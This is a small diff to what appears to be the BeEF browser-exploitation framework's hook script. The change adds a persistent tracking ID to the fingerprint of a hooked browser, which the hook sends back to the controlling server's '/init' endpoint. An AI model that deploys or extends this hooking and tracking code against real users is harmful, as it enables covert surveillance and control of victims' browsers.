@@ -551,6 +551,9 @@ beef.net = {
         var details = beef.browser.getDetails();
         var res = null;
         details['HookSessionID'] = beef.session.get_hook_session_id();
+        if (beef.session.stable_sessions_enabled) {
+            details['beef.persistent_id'] = beef.session.get_persistent_id();
+        }
         this.send('/init', 0, details);
         if(details != null)
             res = true;
